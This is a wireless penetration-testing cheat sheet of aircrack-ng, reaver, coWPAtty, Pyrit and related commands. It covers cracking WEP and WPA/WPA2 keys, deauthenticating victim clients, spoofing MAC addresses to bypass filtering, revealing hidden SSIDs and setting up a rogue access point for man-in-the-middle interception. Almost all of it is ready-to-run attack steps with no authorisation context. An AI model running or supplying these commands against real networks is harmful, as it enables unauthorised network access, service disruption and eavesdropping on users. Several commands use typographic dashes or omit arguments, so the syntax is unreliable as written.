###### Wireless Penetration Testing Cheat Sheet
#### WIRELESS ANTENNA
## Open the Monitor Mode

ifconfig wlan0mon down
iwconfig wlan0mon mode monitor
ifconfig wlan0mon up

## Increase Wi-Fi TX Power
iw reg set B0
iwconfig wlan0 txpower <NmW|NdBm|off|auto>
## txpower is 30 (generally)
## txpower is depends your country, please google it
iwconfig

## Change WiFi Channel
iwconfig wlan0 channel <SetChannel(1-14)>

#### WEP CRACKING
## Method 1 : Fake Authentication Attack

airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
## What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <OurMac> wlan0mon
aircrack-ng –b <BSSID> <PCAP_of_FileName>

## Method 2 : ARP Replay Attack
airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

## What’s my mac?
macchanger --show wlan0mon
aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> wlan0mon
aircrack-ng –b <BSSID> <PCAP_of_FileName>

## Method 3 : Chop Chop Attack
airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
## What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
aireplay-ng -4 –b <BSSID> -h <OurMac> wlan0mon
## Press ‘y’ ;
packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 –r <FileName2> wlan0mon
aircrack-ng <PCAP_of_FileName>

## Method 4 : Fragmentation Attack
airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
## What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
aireplay-ng -5 –b<BSSID> -h < OurMac > wlan0mon
## Press ‘y’ ;
packetforge-ng -0 –a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 –r <FileName2> wlan0mon
aircrack-ng <PCAP_of_FileName>

## Method 5 : SKA (Shared Key Authentication) Type Cracking
airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
ifconfig wlan0mon down
macchanger –-mac <VictimMac> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
aireplay-ng –-deauth 1 –a <BSSID> -h <FakedMac> wlan0mon
aircrack-ng <PCAP_of_FileName>

#### WPA / WPA2 CRACKING

## Method 1 : WPS Attack
airmon-ng start wlan0
apt-get install reaver
wash –i wlan0mon –C
reaver –i wlan0mon –b <BSSID> -vv –S
## or, Specific attack
reaver –i –c <Channel> -b <BSSID> -p <PinCode> -vv –S

## Method 2 : Dictionary Attack
airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>

## Method 3 : Crack with John The Ripper
airmon-ng start wlan0
airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
cd /pentest/passwords/john
./john –wordlist=<Wordlist> --rules –stdout|aircrack-ng -0 –e <ESSID> -w - <PCAP_of_FileName>

## Method 4 : Crack with coWPAtty
airmon-ng start wlan0
airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
cowpatty –r <FileName> -f <Wordlist> -2 –s <SSID>
genpmk –s <SSID> –f <Wordlist> -d <HashesFileName>
cowpatty –r <PCAP_of_FileName> -d <HashesFileName> -2 –s <SSID>

## Method 5 : Crack with Pyrit
airmon-ng start wlan0
airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
pyrit –r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
pyrit –i <Wordlist> import_passwords
pyrit –e <ESSID> create_essid
pyrit batch
pyrit –r <PCAP_of_FileName> attack_db

## Method 6 : Precomputed WPA Keys Database Attack
airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
kwrite ESSID.txt
airolib-ng NEW_DB --import essid ESSID.txt
airolib-ng NEW_DB --import passwd <DictionaryFile>
airolib-ng NEW_DB --clean all
airolib-ng NEW_DB --stats
airolib-ng NEW_DB --batch
airolib-ng NEW_DB --verify all
aircrack-ng –r NEW_DB <Handshaked_PCAP>

#### FIND HIDDEN SSID

airmon-ng start wlan0
airodump-ng –c <Channel> --bssid <BSSID> wlan0mon
aireplay-ng -0 20 –a <BSSID> -c <VictimMac> wlan0mon 

#### BYPASS MAC FILTERING

airmon-ng start wlan0
airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
ifconfig wlan0mon down
macchanger –-mac <VictimMac> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon

#### MAN IN THE MIDDLE ATTACK

airmon-ng start wlan0
airbase-ng –e “<FakeBSSID>” wlan0mon
brctl addbr <VariableName>
brctl addif <VariableName> wlan0mon
brctl addif <VariableName> at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig <VariableName> up
aireplay-ng –deauth 0 –a <victimBSSID> wlan0mon
dhclient3 <VariableName> &
wireshark &
;select <VariableName> interface
